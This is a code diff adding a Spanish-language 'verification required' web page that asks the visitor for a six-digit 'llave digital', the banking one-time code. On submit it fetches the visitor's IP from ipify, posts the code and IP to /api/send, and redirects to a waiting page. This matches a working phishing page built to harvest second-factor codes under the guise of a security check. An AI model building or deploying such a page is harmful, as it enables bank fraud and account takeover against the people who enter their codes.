@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación Requerida</title>
+<!-- Favicon -->
+<link rel="icon" href="favicon.png" type="image/png">
+<style>
+body { margin:0; padding:0; font-family:'Verdana'; background:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; min-height:100vh; }
+.container { text-align:center; max-width:400px; margin:50px auto; }
+input { border-radius:10px; border:1px solid #b3bac8; height:50px; font-size:18px; width:350px; text-align:center; outline:none; margin-bottom:15px; letter-spacing:10px; }
+button { cursor:pointer; background:#08528d; color:#fff; border:none; border-radius:4px; width:250px; height:40px; font-size:14px; }
+button:hover { background:#063d6b; }
+.error-message { color:red; display:none; margin-bottom:10px; }
+header img { width:60px; margin-bottom:20px; }
+</style>
+</head>
+<body>
+
+<header>
+  <img src="favicon.png" alt="Logo">
+</header>
+
+<div class="container">
+<h1>Verificación Requerida</h1>
+<p>Ingresá la llave digital</p>
+<input type="tel" id="smscode" maxlength="6" placeholder="######">
+<p class="error-message" id="error-message"> LA LLAVE DIGITAL DEBE TENER 6 DÍGITOS </p>
+<button onclick="enviarSMS()">Confirmar</button>
+</div>
+
+<script>
+async function enviarSMS(){
+  const smscode = document.getElementById("smscode").value.trim();
+  const errorBox = document.getElementById("error-message");
+  errorBox.style.display = "none";
+
+  // Validación: debe ser exactamente 6 dígitos numéricos
+  if(!/^\d{6}$/.test(smscode)){
+    errorBox.style.display = "block";
+    return;
+  }
+
+  try{
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    const ip = ipData.ip;
+
+    const res = await fetch('/api/send',{
+      method:'POST',
+      headers:{ 'Content-Type':'application/json' },
+      body: JSON.stringify({ smscode, ip })
+    });
+
+    if(res.ok){
+      setTimeout(()=> window.location.href='espera.html', 1000);
+    } else {
+      errorBox.style.display = "block";
+    }
+  }catch(err){
+    console.error(err);
+    errorBox.style.display = "block";
+  }
+}
+</script>
+
+</body>
+</html>
+
+
